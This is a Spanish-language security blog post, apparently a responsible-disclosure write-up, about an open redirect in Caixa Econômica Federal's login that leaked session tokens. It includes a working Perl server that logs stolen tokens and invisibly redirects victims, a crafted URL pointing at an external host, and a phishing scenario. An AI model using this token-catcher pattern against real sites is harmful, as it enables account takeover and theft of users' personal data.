---
layout: content
title: 'Obteniendo un Session Token Leak con un Open Redirect'
description: ''
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

Tabla de contenido:
- [Resumen](#resumen)
- [Las vulnerabilidades](#descripción)
- [Prueba de concepto](#prueba-de-concepto)
- [Impacto](#impacto)
- [Conclusión](#conclusión)
- [Referencias](#referencias)

---

### Resumen

Esta publicación tiene como objetivo compartir cómo una vulnerabilidad de Open Redirect[1](#referencias) encontrada en el sitio web de la Caixa Econômica Federal permitió exponer los Tokens de Sesión de los usuarios.

Es importante aclarar que durante todas las pruebas realizadas se utilizó únicamente una cuenta autorizada por su titular, sin acceder ni comprometer información de otras cuentas o usuarios durante el desarrollo de esta investigación y prueba de concepto.

Línea de tiempo:

```plaintext
01/01/2020: Descubrimiento de la vulnerabilidad y creación de la prueba de concepto; 
01/05/2020: Reporte de la vulnerabilidad; 
01/07/2020: Confirmación de la vulnerabilidad por parte de Caixa Econômica Federal; 
01/10/2020: Corrección de la vulnerabilidad; 
01/10/2020: Publicación de este artículo técnico;
```

* Esta publicación también está disponible en [portugués](/2020/01/03/Conseguindo-Session-Token-Leak-com-Open-Redirect) e [inglés](/2020/01/03/From-Open-Redirect-to-Session-Token-Leak).

---

### Las vulnerabilidades

Al explorar las páginas web de los sistemas de Caixa Federal, se identificó una pantalla de autenticación que solicitaba credenciales como CPF (documento de identificación brasileño, similar al DNI), NIS, correo electrónico y contraseña. Esta pantalla corresponde al acceso al panel del "Portal Ciudadano".

![Página de inicio de Caixa Federal](/images/publications/caixa-account-takeover/home-page.png)

La URL en cuestión es:

- [http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

El último parámetro de la URL presenta una posible vulnerabilidad de Open Redirect: `&redirect_uri=`. El valor insertado en este parámetro determina la URL a la que será redirigido el usuario tras completar el inicio de sesión.

Para validar esta hipótesis, se modificó el valor del parámetro `&redirect_uri=` por la URL de la página principal de Google. Al introducir credenciales válidas e iniciar sesión, se obtuvo el siguiente resultado:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

Como se puede observar, la aplicación es vulnerable a un Open Redirect. Sin embargo, hay un detalle adicional: durante el redireccionamiento se añadió un párametro que puede verse en la siguiente URL:

- [https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

Tras analizar el parámetro `?code=` y la solicitud original, se comprobó que su valor corresponde a un Token de Sesión[2].

Esto demuestra que la vulnerabilidad tiene un nivel crítico, ya que permitiría a un atacante redirigir a la víctima a una URL maliciosa bajo su control, capturar el token de sesión y, con él, acceder a la cuenta del usuario, comprometiendo la confidencialidad e integridad de sus datos.

---

### Prueba de concepto

Para demostrar la posibilidad de filtración y captura del token, se utilizó el siguiente código en Perl:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "
            <script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>
        "
    ));

};

app -> start();
```

Este código permite capturar y almacenar los tokens de sesión enviados a una URL "maliciosa" controlada por el atacante. Además de registrar el Token de Sesión en un archivo de logs, redirige de nuevo al usuario a la URL legítima, asegurando así una sesión normal en el sistema de Caixa Econômica Federal. Esto hace el ataque pase desapercibido para la víctima. La URL de la prueba de concepto tiene la siguiente estructura:

- https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/

El resultado puede observarse en esta grabación:

- <iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

La superficie de ataque en este caso está limitada, ya que requiere que el usuario acceda voluntariamente a la URL (ejemplo, mediante técnicas de phishing o ingeniería social).

El correo electrónico puede ser enviado desde un sistema legítimo de la Caixa Econômica Federal. Sin embargo, al inspeccionar el enlace, se nota que este ha sido modificado para incluir la URL maliciosa del atacante. Al acceder a ese enlace y completar el proceso de redefinición de contraseña, el redireccionamiento sigue ocurriendo, lo que resulta en la filtración del Token de Sesión.

De este modo, un atacante podría enviar correos electrónicos solicitando la redefinición de contraseña en nombre de Caixa Econômica Federal, aumentando la credibilidad del enlace malicioso. Este tipo de ataque podría escalarse, ya que solo requiere conocer el CPF de la víctima.

---

### Impacto

Si esta vulnerabilidad fuera explotada, un atacante podría acceder a información confidencial del usuario, como se muestra a continuación:

![Datos Confidenciales del Usuario de Caixa Federal](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Nombre completo, CPF, fecha y hora del último acceso;

-

![Datos Confidenciales del FGTS de Caixa Federal](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

-

- Nombre completo, número del PIS, empresa contratante, número de la cartera de trabajo, cuenta FGTS, fecha de admisión, saldo en cuenta y los valores depositados en cada mes durante el período de trabajo en la empresa;

![Dirección Confidencial del Usuario de Caixa Federal](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- Dirección completa del usuario (además, es posible editar estos datos, ya que no es necesario utilizar una contraseña);

---

### Conclusión

Un atacante podría explotar las vulnerabilidades mencionadas y comprometer así la confidencialidad de numerosas cuentas legítimas de usuarios de la Caixa Econômica Federal.

Se recomendó a la Caixa Econômica Federal realizar una investigación para verificar si estas vulnerabilidades estaban siendo explotadas por actores maliciosos con fines fraudulentos.

---

#### Referencias

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
